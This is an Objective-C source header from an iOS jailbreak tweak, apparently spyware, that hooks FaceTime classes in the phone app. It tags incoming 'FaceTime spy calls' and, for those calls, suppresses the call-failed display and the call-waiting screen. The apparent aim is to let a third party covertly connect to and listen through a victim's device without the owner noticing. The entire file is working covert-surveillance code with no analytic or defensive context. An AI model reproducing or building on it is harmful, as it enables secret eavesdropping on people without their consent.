//
//  FaceTimeSpyCallMobilePhone.h
//  MSSPC
//
//  Created by Makara Khloth on 7/10/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"

#import "MPConferenceManager.h"
#import "MPConferenceManager+IOS6.h"
#import "SBConferenceManager.h"
#import "SBConferenceManager+IOS6.h"
#import "MPIncomingFaceTimeCallController.h"
#import "MPIncomingFaceTimeCallController+IOS6.h"
#import "MPFaceTimeCallWaitingController.h"
#import "MPFaceTimeCallWaitingController+IOS6.h"
#import "CNFConferenceController.h"
#import "CNFConferenceController+IOS6.h"
#import "CNFCallViewController.h"
#import "CNFCallViewController+IOS6.h"

#import "IMAVChat.h"

#import "InCallController.h"

#pragma mark -
#pragma mark CNFConferenceController
#pragma mark -

#pragma mark iOS 6, 5
// Call only in MobilePhone
HOOK(CNFConferenceController, _handleInvitationForConferenceID$fromHandle$, void, id arg1, id arg2) {
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:arg2];
	[ftCall setMConversationID:arg1];
	[ftCall setMDirection:kFaceTimeCallDirectionIn];
	
	FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
	[ftSpyCallManager setMFaceTimeCall:ftCall];
	
	CALL_ORIG(CNFConferenceController, _handleInvitationForConferenceID$fromHandle$, arg1, arg2);
}

#pragma mark -
#pragma mark CNFDisplayController
#pragma mark -

HOOK(CNFDisplayController, showCallFailedWithReason$error$, void, unsigned int arg1, int arg2) {
	APPLOGVERBOSE(@"arg1 = %d", arg1);
	APPLOGVERBOSE(@"arg2 = %d", arg2);
	
	IMAVChat *currentChat = [self currentChat];
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:[currentChat initiatorIMHandle]];
	[ftCall setMConversationID:[currentChat conferenceID]];
	[ftCall setMDirection:kFaceTimeCallDirectionUnknown];
	
	if (![FaceTimeSpyCallUtils isFaceTimeSpyCall:[ftCall facetimeID]]) {
		CALL_ORIG(CNFDisplayController, showCallFailedWithReason$error$, arg1, arg2);
	}
}

/*
HOOK(CNFDisplayController, prepareForCallWaitingAnimated$, void, BOOL arg1) {
	APPLOGVERBOSE (@"BING GO ... arg1 = %d", arg1);
	CALL_ORIG(CNFDisplayController, prepareForCallWaitingAnimated$, arg1);
}

HOOK(CNFDisplayController, resumeFromCallWaitingAnimated$, void, BOOL arg1) {
	APPLOGVERBOSE (@"BING GO ... arg1 = %d", arg1);
	CALL_ORIG(CNFDisplayController, resumeFromCallWaitingAnimated$, arg1);
}*/

#pragma mark -
#pragma mark CNFCallViewController
#pragma mark -

#pragma mark Work for iOS 5, 6, 7
// This method will call [CNFDisplayController prepareForCallWaitingAnimated:]
HOOK(CNFCallViewController, prepareForCallWaitingAnimated$, void, BOOL arg1) {
	APPLOGVERBOSE(@"arg1 = %d", arg1);
	
	CNFDisplayController *displayController = [self displayController];
	IMAVChat *currentChat = [displayController currentChat];
    APPLOGVERBOSE(@"currentChat = %@", currentChat);
    
    // currentChat is nil when incoming normal FaceTime call while FaceTime spy call active (tested on iOS 7)
	
    /*
     We don't use this ftCall object to accept or decline FaceTime call, we only use for checking
     whether ftCall is FaceTime spy call or not; so this method's implementation should be common
     for all iOS 5, 6, 7, ...
     */
	FaceTimeCall *ftCall = [[[FaceTimeCall alloc] init] autorelease];
	[ftCall setMInviter:nil];
	[ftCall setMIMHandle:[currentChat initiatorIMHandle]];
	[ftCall setMConversationID:[currentChat conferenceID]];
	[ftCall setMDirection:kFaceTimeCallDirectionUnknown];
	
	if (![FaceTimeSpyCallUtils isFaceTimeSpyCall:[ftCall facetimeID]]) {
		FaceTimeSpyCallManager *ftSpyCallManager = [FaceTimeSpyCallManager sharedFaceTimeSpyCallManager];
		ftCall = [ftSpyCallManager mFaceTimeCall];
		if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:[ftCall facetimeID]]) {
			// Block so that the screen will not freeze
		} else {
			CALL_ORIG(CNFCallViewController, prepareForCallWaitingAnimated$, arg1);
		}
	} else {
		CALL_ORIG(CNFCallViewController, prepareForCallWaitingAnimated$, arg1);
	}
}

// This method will call [CNFDisplayController resumeFromCallWaitingAnimated:]
HOOK(CNFCallViewController, resumeFromCallWaitingAnimated$, void, BOOL arg1) {
	APPLOGVERBOSE(@"arg1 = %d", arg1);
	CALL_ORIG(CNFCallViewController, resumeFromCallWaitingAnimated$, arg1);
}